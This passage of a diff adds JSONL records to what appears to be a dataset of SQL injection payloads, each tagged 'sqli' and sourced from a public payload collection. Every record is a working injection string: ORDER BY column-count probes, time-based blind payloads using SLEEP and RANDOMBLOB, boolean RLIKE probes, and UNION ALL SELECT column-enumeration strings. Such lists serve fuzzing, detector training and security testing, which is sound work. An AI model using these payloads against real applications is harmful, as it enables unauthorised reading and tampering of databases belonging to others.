+{"payload": "ORDER BY 14", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 14#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 14--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 15", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 15#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 15--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 16", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 16#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 16--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 17#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 17--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 18", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 18#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 18--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 19", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 19#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 19--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 2", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 2#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 2--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 20", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 20#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 21", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 21#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 21--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 22", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 22#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 22--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 23#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 23--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 24", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 24#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 24--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 25", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 25#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 25--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 26", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 26#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 26--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 27", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 27#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 27--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 28", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 28#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 28--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 29#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 29--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 3#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 3--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 30", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 30#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 30--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 31337", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 31337#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 31337--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 4", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 4#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 4--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 5", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 5#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 5--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 6#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 6--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 7#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 7--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 8", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 8#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 8--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 9", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 9#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 9--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "PRINT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "PRINT @@variable", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "RANDOMBLOB(1000000000/2)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "RANDOMBLOB(500000000/2)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "SLEEP(5)=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "SLEEP(5)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "attack_type": "sqli", "source": "payloadbox-sqli"}
